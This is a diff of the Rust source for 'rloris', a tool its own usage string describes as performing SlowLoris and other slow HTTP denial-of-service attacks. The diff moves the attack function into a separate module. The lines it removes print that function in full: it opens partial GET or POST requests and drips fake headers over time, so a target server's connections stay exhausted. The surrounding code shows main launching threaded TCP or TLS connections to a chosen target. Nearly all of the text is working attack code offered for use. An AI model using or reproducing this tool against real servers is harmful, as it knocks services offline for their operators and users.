@@ -1,6 +1,3 @@
-// For std::thread::sleep_ms.
-#![allow(deprecated)]
-
 extern crate docopt;
 extern crate rustc_serialize;
 extern crate openssl;
@@ -9,10 +6,11 @@ extern crate env_logger;
 
 use docopt::Docopt;
 use std::net::TcpStream;
-use std::io::{Read, Write};
 use std::thread;
-use std::thread::sleep_ms;
 use openssl::ssl::{SslMethod, SslConnectorBuilder};
+
+mod slowloris_attack;
+use slowloris_attack::slowloris_attack;
 
 const USAGE: &'static str = "
 rloris - SlowLoris and other Slow HTTP DoSes in Rust
@@ -71,40 +69,6 @@ impl Target {
     }
 }
 
-/// request_attack performs a SlowLoris style delay request attack against a server
-/// which can be written to via the given `connection` (reader/writer). 
-/// `timeout` is the total time for the attack to progress, in milliseconds.
-/// `cycles` is the number of times a new fake header should be written, or 0 for no additional headers.
-/// `finalize` sets whether or not to send the terminating `\r\n`, and `post` changes the verb from GET to POST.
-/// `threadn` is the thread number of this thread.
-fn request_attack<T: Sized + Write>(connection: &mut T, timeout: u32, cycles: u32, finalize: bool, post: bool, threadn: usize) {
-    // Start a valid HTTP request
-    let initial_request = if post {b"POST / HTTP/1.0\r\n"} else {b"GET  / HTTP/1.0\r\n"};
-    connection.write_all(initial_request)
-        .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write GET request: {}", threadn, e); panic!();});
-    info!("[REQUEST:{}] Wrote {} request.", threadn, if post {"POST"} else {"GET"});
-
-    // Delay cycle
-    // Conditional here limits requests to one per ten milliseconds
-    let real_cycles = if cycles < timeout/10 {cycles} 
-                      else {info!("[REQUEST] Too many cycles! Limiting."); timeout/10};
-    info!("[REQUEST:{}] Beginning delay attack: {} ms, {} cycles, {} ms/cycle.", threadn, timeout, real_cycles, timeout/real_cycles);
-    for _ in 0..(real_cycles) {
-        // Timeout / cycles gives the number of ms for one cycle
-        sleep_ms(timeout / cycles);
-        connection.write_all(b"X-Not-Real: \"Some Bullshit\"\r\n")
-            .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write header. {}", threadn, e); panic!();});
-    }
-
-    if finalize {
-        connection.write_all(b"\r\n")
-            .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write finalizer. {}", threadn, e); panic!();});
-        info!("[REQUEST:{}] Wrote finalizer.", threadn);
-    } else {
-        info!("[REQUEST:{}] Terminating without finalizer.", threadn);
-    }
-}
-
 fn main() {
     // Set up logging
     env_logger::init().unwrap();
@@ -155,9 +119,9 @@ fn main() {
                         let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream)
                             .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect TLS. {}\nDid you provide a domain name, not an IP?", threadn, e); panic!();});
                         info!("[CONTROL:{}] Successfully connected with TLS.", threadn);
-                        request_attack(&mut ssl_stream, timeout, cycles, finalize, post, threadn);
+                        slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, post, threadn);
                     } else {
-                        request_attack(&mut tcp_stream, timeout, cycles, finalize, post, threadn);
+                        slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, post, threadn);
                     }
                 })
             );
